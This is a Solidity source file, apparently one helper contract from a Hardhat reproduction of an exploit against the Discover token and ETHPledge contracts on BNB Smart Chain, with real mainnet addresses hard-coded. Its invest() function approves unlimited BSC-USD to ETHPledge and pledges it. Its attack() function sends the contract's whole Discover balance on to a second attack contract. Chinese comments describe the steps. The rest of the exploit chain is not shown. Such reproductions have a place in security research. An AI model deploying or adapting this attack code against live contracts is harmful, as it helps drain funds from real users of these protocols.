// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../interface.sol";
import "hardhat/console.sol";


contract Attack30 {

    address public BSC_USDAddr = 0x55d398326f99059fF775485246999027B3197955;
    address public DiscoverAddr = 0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267;
    address public pancakeCreateAddr = 0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d;
    address public ETHPledgeAddr = 0xe732a7bD6706CBD6834B300D7c56a8D2096723A7;
    address public pancakeRouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public decimal = 10 ** 18;

    function attack(address attack79Addr) public payable {
        console.log("===========attack30 attack===========");
        (bool success1, bytes memory balance) = DiscoverAddr.call(
            abi.encodeWithSignature('balanceOf(address)', address(this))
        );
        uint256 balanceAmount = abi.decode(balance, (uint256)); // 解码 balance 为 uint256
        require(success1, "Call to Discover balanceOf failed");

        //30合约的DISCOVER 全部转给79合约
        (bool success2,) = DiscoverAddr.call(
            abi.encodeWithSignature('transfer(address,uint256)', attack79Addr, balanceAmount)
        );
        require(success2, "Call to Discover transfer failed");
    }


    function invest() public payable {

        (bool success1, bytes memory balance) = BSC_USDAddr.call(
            abi.encodeWithSignature('balanceOf(address)', address(this))
        );

        require(success1, "Call to BSC_USD balanceOf failed");

        // bUSDAddr 的 approve
        (bool success2,) = BSC_USDAddr.call(
            abi.encodeWithSignature('approve(address,uint256)', ETHPledgeAddr, type(uint256).max)
        );

        require(success2, "Call to  BSC_USD approve failed");

        uint256 balanceAmount = abi.decode(balance, (uint256));

        (bool success3,) = ETHPledgeAddr.call(
            abi.encodeWithSignature('pledgein(address,uint256)', 0, balanceAmount)
        );
        require(success3, "Call to ETHPledge pledgein failed");
    }
}
